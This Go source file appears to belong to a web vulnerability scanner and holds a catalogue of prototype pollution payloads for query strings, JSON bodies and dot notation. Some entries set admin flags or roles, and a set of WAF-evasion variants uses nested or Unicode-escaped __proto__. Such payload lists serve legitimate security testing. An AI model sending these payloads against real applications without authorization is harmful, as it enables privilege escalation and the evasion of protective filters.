package protopollution

// Technique represents a prototype pollution injection technique.
type Technique string

const (
	// TechQueryParam indicates payload injection via query parameters.
	TechQueryParam Technique = "query_param"
	// TechJSONBody indicates payload injection via JSON request body.
	TechJSONBody Technique = "json_body"
	// TechDotNotation indicates payload injection via dot notation.
	TechDotNotation Technique = "dot_notation"
)

// Payload represents a prototype pollution payload.
type Payload struct {
	Value       string
	Technique   Technique
	Description string
	WAFBypass   bool
}

// GetPayloads returns all prototype pollution payloads.
func GetPayloads() []Payload {
	var all []Payload
	all = append(all, queryParamPayloads...)
	all = append(all, jsonBodyPayloads...)
	all = append(all, dotNotationPayloads...)
	all = append(all, wafBypassPayloads...)
	return all
}

// GetPayloadsByTechnique returns payloads filtered by technique.
func GetPayloadsByTechnique(tech Technique) []Payload {
	var result []Payload
	for _, p := range GetPayloads() {
		if p.Technique == tech {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// Query parameter payloads (__proto__[key]=value style).
// Source: PayloadsAllTheThings, HackTricks
var queryParamPayloads = []Payload{
	{Value: "__proto__[skws]=1", Technique: TechQueryParam, Description: "Prototype pollution via __proto__ bracket notation"},
	{Value: "__proto__[constructor]=1", Technique: TechQueryParam, Description: "Prototype pollution targeting constructor property"},
	{Value: "__proto__[toString]=1", Technique: TechQueryParam, Description: "Prototype pollution overriding toString"},
	{Value: "__proto__[hasOwnProperty]=1", Technique: TechQueryParam, Description: "Prototype pollution overriding hasOwnProperty"},
	{Value: "__proto__[isAdmin]=true", Technique: TechQueryParam, Description: "Prototype pollution setting admin flag"},
	{Value: "__proto__[role]=admin", Technique: TechQueryParam, Description: "Prototype pollution setting role to admin"},
}

// JSON body payloads ({"__proto__": {"key": "value"}} style).
// Source: PayloadsAllTheThings, HackTricks
var jsonBodyPayloads = []Payload{
	{Value: `{"__proto__":{"skws":"1"}}`, Technique: TechJSONBody, Description: "JSON body prototype pollution via __proto__"},
	{Value: `{"constructor":{"prototype":{"skws":"1"}}}`, Technique: TechJSONBody, Description: "JSON body prototype pollution via constructor.prototype"},
	{Value: "constructor.prototype.skws=1", Technique: TechJSONBody, Description: "Constructor prototype pollution via dot path"},
	{Value: `{"__proto__":{"isAdmin":true}}`, Technique: TechJSONBody, Description: "JSON prototype pollution setting admin flag"},
	{Value: `{"__proto__":{"role":"admin"}}`, Technique: TechJSONBody, Description: "JSON prototype pollution setting role"},
	{Value: `{"__proto__":{"toString":"polluted"}}`, Technique: TechJSONBody, Description: "JSON prototype pollution overriding toString"},
}

// Dot notation payloads (__proto__.key=value style).
// Source: PayloadsAllTheThings, HackTricks
var dotNotationPayloads = []Payload{
	{Value: "__proto__.skws=1", Technique: TechDotNotation, Description: "Dot notation prototype pollution"},
	{Value: "__proto__.constructor.name=1", Technique: TechDotNotation, Description: "Dot notation targeting constructor.name"},
	{Value: "__proto__.isAdmin=true", Technique: TechDotNotation, Description: "Dot notation setting admin flag"},
	{Value: "__proto__.role=admin", Technique: TechDotNotation, Description: "Dot notation setting role to admin"},
	{Value: "__proto__.valueOf=polluted", Technique: TechDotNotation, Description: "Dot notation overriding valueOf"},
}

// WAF bypass payloads that use encoding or alternative syntax.
// Source: PayloadsAllTheThings
var wafBypassPayloads = []Payload{
	{Value: `{"__pro__proto__to__":{"skws":"1"}}`, Technique: TechJSONBody, Description: "Nested __proto__ bypass", WAFBypass: true},
	{Value: `{"\\u005f\\u005fproto\\u005f\\u005f":{"skws":"1"}}`, Technique: TechJSONBody, Description: "Unicode escaped __proto__", WAFBypass: true},
	{Value: "constructor[prototype][skws]=1", Technique: TechQueryParam, Description: "Constructor prototype bracket bypass", WAFBypass: true},
}
